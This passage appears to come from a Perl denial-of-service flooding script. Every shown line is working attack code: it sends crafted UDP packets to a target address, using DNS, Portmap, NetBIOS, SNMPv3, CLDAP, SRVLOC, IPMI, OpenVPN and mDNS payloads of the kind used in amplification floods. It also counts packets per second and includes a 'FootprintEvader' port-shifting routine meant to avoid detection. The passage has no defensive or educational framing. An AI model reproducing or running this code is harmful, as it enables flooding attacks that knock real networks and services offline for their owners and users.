		if($ports[0] == 7){
			$port_shifted = int(rand(50000)+10000);
			for (my $i=0; $i < 10; $i++) {
				$ports[$i] += $port_shifted;
			}
			print "[FootprintEvader] Shifting all ports +" . $port_shifted . "!\r\n";
		}
		else{
			for (my $i=0; $i < 10; $i++) {
				$ports[$i] -= $port_shifted;
			}
		}
		
		

	}
	
	if($temp == "1") {
	# ECHO Request #
	send("flood", "\x0D\x0A\x0D\x0A", 0, pack_sockaddr_in($ports[0], $iaddr));
	}
	elsif($temp == "2") {
	# DNS A Query NEED INPROVEMENT #
	send("flood", $hexed . $hexed . "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01", 0, pack_sockaddr_in($ports[1], $iaddr));
	# DNS CNAME Query NEED INPROVEMENT #
	send("flood", $hexed . $hexed . "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01", 0, pack_sockaddr_in($ports[1], $iaddr));
	}
	elsif($temp == "3") {
	# Portmap Inproved #
	send("flood", $hexed3 . $hexed2 . $hexed . $hexed4 . "\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xA0" . $hexed4 . $hexed . $hexed1 . $hexed2 . "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 0, pack_sockaddr_in($ports[2], $iaddr));
	}
	elsif($temp == "4") {
	# NetBIOS Datagram Service NEED INPROVEMENT Ilegal last 2 hex #
	send("flood", "\x12\x03" . $hexed . "\x11\x01\x01" . $hexed2 . $hexed1 . $hexed3 . $hexed4 . $hexed . $hexed . $hexed1 . $hexed2 . "\x64\x6e", 0, pack_sockaddr_in($ports[3], $iaddr));
	}
	elsif($temp == "5") {
	# SNMPv3 get-request Inproved #
	send("flood", "\x30\x3A\x02\x01\x03\x30\x0F\x02\x02" . $hexed2 . $hexed3 . "\x02\x03\x00\xFF\xE3\x04\x01\x04\x02\x01\x03\x04\x10\x30\x0E\x04\x00\x02\x01\x00\x02\x01\x00\x04\x00\x04\x00\x04\x00\x30\x12\x04\x00\x04\x00\xA0\x0C\x02\x02" . $hexed . $hexed1 ."\x02\x01\x00\x02\x01\x00\x30\x00", 0, pack_sockaddr_in($ports[4], $iaddr));
	}
	elsif($temp == "6") {
	# CLDAP little Inproved #
	send("flood", "\x30\x84\x00\x00\x00\x2d\x02\x01" . $hexed3 . "\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00", 0, pack_sockaddr_in($ports[5], $iaddr));
	}
	elsif($temp == "7") {
	# SRVLOC Inproved #
	send("flood", "\x02\x01" . $hexed4 . $hexed2 . $hexed3 . "\x00\x00" . $hexed1 . $hexed . $hexed4 . $hexed2 . $hexed3 . "\x00\x02en\x00\x00\x00\x15service:service-agent\x00\x07default\x00\x00\x00\x00", 0, pack_sockaddr_in($ports[6], $iaddr));
	}
	elsif($temp == "8") {
	# IPMI Inproved #
	send("flood", "\x06\x00" . $hexed . "\x07\x00" . $hexed2 . $hexed . $hexed1 . $hexed4 . $hexed3 . $hexed4 . $hexed . $hexed1 . "\x00\x00\x00\x00\x09\x20\x18\xc8\x81\x00\x38\x8e\x04\xb5", 0, pack_sockaddr_in($ports[7], $iaddr));
	}
	elsif($temp == "9") {
	# OpenVPN P_CONTROL_HARD_RESET_CLIENT_V2 Inproved #
	send("flood", "\x38" . $hexed . $hexed1 . $hexed2 . $hexed3 . $hexed4 . $hexed5 . $hexed6 . $hexed7 . "\x00\x00" . $hexed7 . $hexed5 . $hexed3, 0, pack_sockaddr_in($ports[8], $iaddr));
	}
	elsif($temp == "0") {
	# mDNS Inproved #
	send("flood", $hexed4 . $hexed7 . "\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0C\x00\x01", 0, pack_sockaddr_in($ports[9], $iaddr));
	}

	$pps++;
	
	};
	
	